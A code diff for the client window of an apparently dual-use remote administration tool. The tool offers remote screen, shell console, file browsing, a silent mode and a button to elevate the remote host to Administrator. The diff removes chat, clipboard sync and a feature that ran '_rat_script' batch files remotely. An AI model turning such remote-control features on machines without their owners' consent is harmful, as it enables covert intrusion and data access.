@@ -17,7 +17,6 @@ public partial class MainWindow : Window
     private string? _activeSessionMachineId;
     private int _remoteWidth;
     private int _remoteHeight;
-    private bool _chatVisible;
 
     // Auto-reconnect
     private string? _savedRelayUrl;
@@ -34,7 +33,6 @@ public partial class MainWindow : Window
 
     // View-model collections
     public ObservableCollection<NodeViewModel> Nodes { get; } = new();
-    public ObservableCollection<ChatEntry> ChatEntries { get; } = new();
     public ObservableCollection<TenantViewModel> Tenants { get; } = new();
     public ObservableCollection<RemoteFileEntry> RemoteFiles { get; } = new();
     private MonitorViewModel _monitorViewModel = new();
@@ -43,7 +41,6 @@ public partial class MainWindow : Window
     {
         InitializeComponent();
         NodeList.ItemsSource    = Nodes;
-        ChatMessages.ItemsSource = ChatEntries;
         TenantList.ItemsSource  = Tenants;
         RemoteFileList.ItemsSource = RemoteFiles;
         MonitorPanel.DataContext = _monitorViewModel;
@@ -82,9 +79,7 @@ public partial class MainWindow : Window
         _client.HostWentOffline     += OnHostWentOffline;
         _client.SessionStarted      += OnSessionStarted;
         _client.FrameReceived       += OnFrameReceived;
-        _client.ClipboardReceived   += OnClipboardReceived;
         _client.MonitorListReceived += OnMonitorListReceived;
-        _client.ChatReceived        += OnChatReceived;
         _client.Disconnected        += OnDisconnected;
         _client.TenantListReceived  += OnTenantListReceived;
         _client.TenantCreated       += OnTenantCreated;
@@ -374,18 +369,6 @@ public partial class MainWindow : Window
         EndSessionUI();
     }
 
-    // ---- Clipboard ----
-
-    private void OnClipboardReceived(object? sender, string text)
-        => Dispatcher.Invoke(() => { try { Clipboard.SetText(text); } catch { } });
-
-    private async void ClipboardSyncButton_Click(object sender, RoutedEventArgs e)
-    {
-        if (_client is null) return;
-        try { var text = Clipboard.GetText(); if (!string.IsNullOrEmpty(text)) await _client.SendClipboardAsync(text); }
-        catch { }
-    }
-
     // ---- Monitor selector ----
 
     private void OnMonitorListReceived(object? sender, MonitorInfoData[] monitors)
@@ -406,30 +389,6 @@ public partial class MainWindow : Window
     {
         if (_client is null || MonitorSelector.SelectedItem is not MonitorComboItem item) return;
         await _client.SelectMonitorAsync(item.Index);
-    }
-
-    // ---- Chat ----
-
-    private void OnChatReceived(object? sender, ChatMessageData msg)
-        => Dispatcher.Invoke(() => { ChatEntries.Add(new ChatEntry(msg.SenderName, msg.Text)); ChatMessages.ScrollIntoView(ChatEntries[^1]); });
-
-    private void ChatToggleButton_Click(object sender, RoutedEventArgs e)
-    {
-        _chatVisible = !_chatVisible;
-        ChatColumn.Width = _chatVisible ? new GridLength(280) : new GridLength(0);
-        ChatPanel.Visibility = _chatVisible ? Visibility.Visible : Visibility.Collapsed;
-    }
-
-    private async void ChatSendButton_Click(object sender, RoutedEventArgs e) => await SendChatMessageAsync();
-    private async void ChatInput_KeyDown(object sender, KeyEventArgs e) { if (e.Key == Key.Enter) { await SendChatMessageAsync(); e.Handled = true; } }
-
-    private async Task SendChatMessageAsync()
-    {
-        if (_client is null || string.IsNullOrWhiteSpace(ChatInput.Text)) return;
-        var text = ChatInput.Text.Trim(); ChatInput.Clear();
-        ChatEntries.Add(new ChatEntry("Admin", text));
-        ChatMessages.ScrollIntoView(ChatEntries[^1]);
-        await _client.SendChatAsync("Admin", text);
     }
 
     // ---- Node list ----
@@ -474,13 +433,13 @@ public partial class MainWindow : Window
 
         ScreenTab.Visibility    = Visibility.Collapsed;
         ConsolePanel.Visibility = Visibility.Collapsed;
-        CodePanel.Visibility    = Visibility.Collapsed;
         FilesPanel.Visibility   = Visibility.Collapsed;
         DevicePanel.Visibility  = Visibility.Collapsed;
         MonitorPanel.Visibility = Visibility.Collapsed;
 
         ConsoleOutput.Document.Blocks.Clear();
-        CodeOutput.Document.Blocks.Clear();
+        AdminBadge.Visibility = Visibility.Collapsed;
+        ElevateHostBtn.Visibility = Visibility.Collapsed;
         RemoteFiles.Clear();
 
         // Clear Device Info display
@@ -503,7 +462,7 @@ public partial class MainWindow : Window
         SilentModeCheckBox.IsChecked = false;
 
         // Reset tab highlights to Screen as default
-        var buttons = new[] { TabScreenBtn, TabConsoleBtn, TabCodeBtn, TabFilesBtn, TabDeviceBtn, TabMonitorBtn };
+        var buttons = new[] { TabScreenBtn, TabConsoleBtn, TabFilesBtn, TabDeviceBtn, TabMonitorBtn };
         for (int i = 0; i < buttons.Length; i++)
         {
             buttons[i].Background = i == 0 ? ColorBrush("#89b4fa") : ColorBrush("Transparent");
@@ -525,20 +484,19 @@ public partial class MainWindow : Window
         if (_client is not null && new TextRange(ConsoleOutput.Document.ContentStart, ConsoleOutput.Document.ContentEnd).Text.Length < 5)
             _ = _client.SendShellInputAsync("echo Shell ready");
     }
-    private void TabCodeBtn_Click(object sender, RoutedEventArgs e)    => SetSessionTab(2);
     private void TabFilesBtn_Click(object sender, RoutedEventArgs e)
     {
-        SetSessionTab(3);
+        SetSessionTab(2);
         _ = _client?.RequestDirectoryAsync(_currentRemotePath);
     }
     private void TabDeviceBtn_Click(object sender, RoutedEventArgs e)
     {
-        SetSessionTab(4);
+        SetSessionTab(3);
         _ = _client?.RequestDeviceInfoAsync();
     }
     private void TabMonitorBtn_Click(object sender, RoutedEventArgs e)
     {
-        SetSessionTab(5);
+        SetSessionTab(4);
         _ = _client?.RequestDeviceInfoAsync();
         _ = _client?.SendStatsRequestAsync(true);
     }
@@ -547,30 +505,21 @@ public partial class MainWindow : Window
     {
         ScreenTab.Visibility    = tab == 0 ? Visibility.Visible : Visibility.Collapsed;
         ConsolePanel.Visibility = tab == 1 ? Visibility.Visible : Visibility.Collapsed;
-        CodePanel.Visibility    = tab == 2 ? Visibility.Visible : Visibility.Collapsed;
-        FilesPanel.Visibility   = tab == 3 ? Visibility.Visible : Visibility.Collapsed;
-        DevicePanel.Visibility  = tab == 4 ? Visibility.Visible : Visibility.Collapsed;
-        MonitorPanel.Visibility = tab == 5 ? Visibility.Visible : Visibility.Collapsed;
+        FilesPanel.Visibility   = tab == 2 ? Visibility.Visible : Visibility.Collapsed;
+        DevicePanel.Visibility  = tab == 3 ? Visibility.Visible : Visibility.Collapsed;
+        MonitorPanel.Visibility = tab == 4 ? Visibility.Visible : Visibility.Collapsed;
 
         // Stop stats when leaving monitor tab
-        if (tab != 5) _ = _client?.SendStatsRequestAsync(false);
+        if (tab != 4) _ = _client?.SendStatsRequestAsync(false);
 
         // Update tab button highlight
-        var buttons = new[] { TabScreenBtn, TabConsoleBtn, TabCodeBtn, TabFilesBtn, TabDeviceBtn, TabMonitorBtn };
+        var buttons = new[] { TabScreenBtn, TabConsoleBtn, TabFilesBtn, TabDeviceBtn, TabMonitorBtn };
         for (int i = 0; i < buttons.Length; i++)
         {
             bool active = i == tab;
             buttons[i].Background  = active ? ColorBrush("#89b4fa") : ColorBrush("Transparent");
             buttons[i].Foreground  = active ? ColorBrush("#1e1e2e") : ColorBrush("#cdd6f4");
             buttons[i].FontWeight  = active ? FontWeights.SemiBold : FontWeights.Normal;
-        }
-
-        // Update shell prompt label for cmd vs powershell
-        if (tab == 1)
-        {
-            var isCmdShell = ShellTypeCombo.SelectedIndex == 1;
-            var promptBlock = FindName("ConsolePromptLabel") as TextBlock;
-            // prompt label text is in XAML as "PS>" - updated dynamically below
         }
     }
 
@@ -585,12 +534,38 @@ public partial class MainWindow : Window
     private void OnShellOutputReceived(object? sender, ShellOutputMessage msg)
         => Dispatcher.Invoke(() =>
         {
-            // Route output to whichever panel is showing (terminal or code)
-            if (CodePanel.IsVisible)
-                AppendRichText(CodeOutput, msg.Text + "\n", msg.IsError ? "#f38ba8" : "#a6e3a1");
-            else
-                AppendTerminalText(msg.Text + "\n", msg.IsError);
+            if (msg.Text.Contains("[ADMINISTRATOR", StringComparison.OrdinalIgnoreCase))
+            {
+                AdminBadge.Visibility = Visibility.Visible;
+                AdminBadgeText.Text = "🛡️ ADMINISTRATOR";
+                AdminBadge.Background = ColorBrush("#a6e3a1");
+                AdminBadgeText.Foreground = ColorBrush("#1e1e2e");
+                ElevateHostBtn.Visibility = Visibility.Collapsed;
+            }
+            else if (msg.Text.Contains("[STANDARD USER", StringComparison.OrdinalIgnoreCase))
+            {
+                AdminBadge.Visibility = Visibility.Visible;
+                AdminBadgeText.Text = "⚠️ STANDARD USER";
+                AdminBadge.Background = ColorBrush("#f9e2af");
+                AdminBadgeText.Foreground = ColorBrush("#1e1e2e");
+                ElevateHostBtn.Visibility = Visibility.Visible;
+            }
+
+            AppendTerminalText(msg.Text + "\n", msg.IsError);
         });
+
+    private async void ElevateHostBtn_Click(object sender, RoutedEventArgs e)
+    {
+        if (_client is null) return;
+        var res = MessageBox.Show(
+            "This will relaunch the remote Host process with Administrator privileges (via Windows UAC).\n\nProceed?",
+            "Elevate Host to Administrator", MessageBoxButton.YesNo, MessageBoxImage.Question);
+        if (res == MessageBoxResult.Yes)
+        {
+            AppendTerminalText("[Requesting remote host elevation to Administrator...]\n", isError: false);
+            await _client.ElevateHostAsync();
+        }
+    }
 
     private void AppendTerminalText(string text, bool isError)
     {
@@ -673,42 +648,15 @@ public partial class MainWindow : Window
         await _client.SendShellInputAsync($"##SHELL_TYPE:{shellType}");
     }
 
-    // ---- Code Editor ----
-
-    private async void CodeRunBtn_Click(object sender, RoutedEventArgs e)
-    {
-        if (_client is null || string.IsNullOrWhiteSpace(CodeEditor.Text)) return;
-
-        CodeOutput.Document.Blocks.Clear();
-        AppendRichText(CodeOutput, "Running script...\n", "#6c7086");
-
-        var script = CodeEditor.Text;
-        var isPs   = CodeLanguageCombo.SelectedIndex == 0;
-
-        if (isPs)
-        {
-            // Wrap multi-line PS in a scriptblock and send as one block
-            var lines = script.Split('\n', StringSplitOptions.RemoveEmptyEntries);
-            foreach (var line in lines)
-            {
-                var trimmed = line.TrimEnd();
-                if (!string.IsNullOrWhiteSpace(trimmed))
-                    await _client.SendShellInputAsync(trimmed);
-            }
-        }
-        else
-        {
-            // Batch: write to temp file and execute
-            var tempName = $"_rat_script_{Guid.NewGuid():N}.bat";
-            var tempPath = Path.Combine(Path.GetTempPath(), tempName);
-            await _client.SendShellInputAsync($"$env:TEMP\\{tempName} | Out-Null; Set-Content '{tempPath}' @'\n{script}\n'@; cmd /c '{tempPath}'; Remove-Item '{tempPath}' -EA SilentlyContinue");
-        }
-    }
-
-    private void CodeClearOutputBtn_Click(object sender, RoutedEventArgs e)
-        => CodeOutput.Document.Blocks.Clear();
-
     // ---- File Manager ----
+
+    private void QuickDriveRoot_Click(object sender, RoutedEventArgs e) => _ = _client?.RequestDirectoryAsync("\\");
+    private void QuickDriveC_Click(object sender, RoutedEventArgs e)    => _ = _client?.RequestDirectoryAsync("C:\\");
+    private void QuickDesktop_Click(object sender, RoutedEventArgs e)   => _ = _client?.RequestDirectoryAsync("%DESKTOP%");
+    private void QuickDownloads_Click(object sender, RoutedEventArgs e) => _ = _client?.RequestDirectoryAsync("%DOWNLOADS%");
+    private void QuickDocuments_Click(object sender, RoutedEventArgs e) => _ = _client?.RequestDirectoryAsync("%DOCUMENTS%");
+    private void QuickTemp_Click(object sender, RoutedEventArgs e)      => _ = _client?.RequestDirectoryAsync("%TEMP%");
+    private void RemotePathRefreshBtn_Click(object sender, RoutedEventArgs e) => _ = _client?.RequestDirectoryAsync(_currentRemotePath);
 
     private void OnDirectoryListReceived(object? sender, DirectoryListResponseMessage resp)
     {
@@ -726,12 +674,13 @@ public partial class MainWindow : Window
 
             // Add ".." up entry unless we're at root
             if (resp.Path != "\\")
-                RemoteFiles.Add(new RemoteFileEntry { Name = "..", FullPath = "..", IsDirectory = true, TypeLabel = "Folder", SizeLabel = "", LastModified = "" });
+                RemoteFiles.Add(new RemoteFileEntry { Icon = "📁", Name = "..", FullPath = "..", IsDirectory = true, TypeLabel = "Folder", SizeLabel = "", LastModified = "" });
 
             foreach (var entry in resp.Entries.OrderByDescending(e => e.IsDirectory).ThenBy(e => e.Name))
             {
                 RemoteFiles.Add(new RemoteFileEntry
                 {
+                    Icon         = GetFileIcon(entry.Name, entry.IsDirectory),
                     Name         = entry.Name,
                     FullPath     = entry.FullPath,
                     IsDirectory  = entry.IsDirectory,
@@ -741,6 +690,21 @@ public partial class MainWindow : Window
                 });
             }
         });
+    }
+
+    private static string GetFileIcon(string name, bool isDir)
+    {
+        if (isDir) return "📁";
+        var ext = Path.GetExtension(name).ToLowerInvariant();
+        return ext switch
+        {
+            ".exe" or ".msi" or ".bat" or ".cmd" or ".ps1" or ".vbs" => "⚙️",
+            ".zip" or ".rar" or ".7z" or ".tar" or ".gz" or ".iso" => "📦",
+            ".txt" or ".log" or ".md" or ".ini" or ".cfg" or ".json" or ".xml" or ".csv" => "📄",
+            ".png" or ".jpg" or ".jpeg" or ".bmp" or ".gif" or ".webp" or ".ico" => "🖼️",
+            ".mp4" or ".mkv" or ".avi" or ".mov" or ".mp3" or ".wav" => "🎵",
+            _ => "📄"
+        };
     }
 
     private static string FormatSize(long bytes)
@@ -1001,8 +965,6 @@ public partial class MainWindow : Window
 
 // ---- Helper types ----
 
-public record ChatEntry(string Sender, string Text);
-
 public record MonitorComboItem(int Index, string Label)
 {
     public override string ToString() => Label;
@@ -1010,6 +972,7 @@ public record MonitorComboItem(int Index, string Label)
 
 public class RemoteFileEntry
 {
+    public string Icon         { get; set; } = "📄";
     public string Name         { get; set; } = "";
     public string FullPath     { get; set; } = "";
     public bool   IsDirectory  { get; set; }
